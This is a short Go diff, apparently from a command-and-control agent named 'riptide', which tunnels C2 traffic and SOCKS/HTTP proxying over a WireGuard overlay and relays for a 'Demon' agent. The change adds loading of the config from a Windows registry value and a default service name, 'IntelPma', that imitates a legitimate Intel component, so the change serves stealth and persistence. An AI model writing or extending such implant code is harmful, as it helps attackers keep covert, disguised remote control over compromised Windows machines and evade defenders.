@@ -16,13 +16,14 @@ import (
 )
 
 func main() {
-	cfgPath := flag.String("config", "peer.conf", "wireguard conf (hub or peer)")
+	cfgPath := flag.String("config", "peer.conf", "wireguard conf, or reg:HKLM\\SOFTWARE\\...\\Value")
+	svcName := flag.String("svc", "IntelPma", "windows service name (SCM)")
 	httpBind := flag.String("http", "", "override [Riptide] HTTP (Demon proxy)")
 	socksBind := flag.String("socks", "", "override [Riptide] local SOCKS")
 	c2 := flag.String("c2", "", "override C2 host:port list (comma)")
 	c2via := flag.String("c2-via", "", "overlay dest for C2 (default 10.66.0.1:443)")
 	flag.Parse()
-	if maybeService(*cfgPath) {
+	if maybeService(*cfgPath, *svcName) {
 		return
 	}
 	runAgent(*cfgPath, extraFlags{*httpBind, *socksBind, *c2, *c2via})
@@ -36,7 +37,7 @@ func runAgent(cfgPath string, ov extraFlags) {
 	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
 	log.SetPrefix("riptide ")
 
-	c, err := loadConf(cfgPath)
+	c, err := tryLoadConf(cfgPath)
 	if err != nil {
 		log.Fatalf("conf: %v", err)
 	}
